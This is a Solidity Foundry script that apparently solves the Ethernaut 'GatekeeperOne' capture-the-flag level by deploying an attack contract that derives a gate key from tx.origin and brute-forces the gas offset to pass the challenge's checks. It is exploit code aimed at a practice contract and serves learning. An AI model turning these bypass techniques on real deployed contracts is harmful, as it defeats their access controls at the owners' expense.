// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {GatekeeperOne} from "../../src/level-13/EthernautGatekeeperOne.sol";

contract GatekeeperOneSolution is Script {
    GatekeeperOneAttack gateKeeperOneAttack;
    bytes8 gateKey = bytes8(uint64(uint160(tx.origin)));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        gateKeeperOneAttack = new GatekeeperOneAttack();
        gateKeeperOneAttack.attack(0x673891D55324C4eA2c2986B550E3dbe5BC7Ddda5);
        vm.stopBroadcast();
    }
}

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack is IGatekeeperOne {
    function enter(bytes8) external pure returns (bool) {
        return true;
    }

    function attack(address gatekeeper) external {
        // Get lower 2 bytes of tx.origin
        uint16 origin16 = uint16(uint160(tx.origin));
        // Build gateKey: upper 4 bytes != 0, lower 4 bytes == origin16
        bytes8 gateKey = bytes8(uint64((1 << 32) | origin16)); // Valid (test with chisel) -> Gate 3 bypassed

        // Brute-force gas
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = gatekeeper.call{gas: 8191 * 10 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
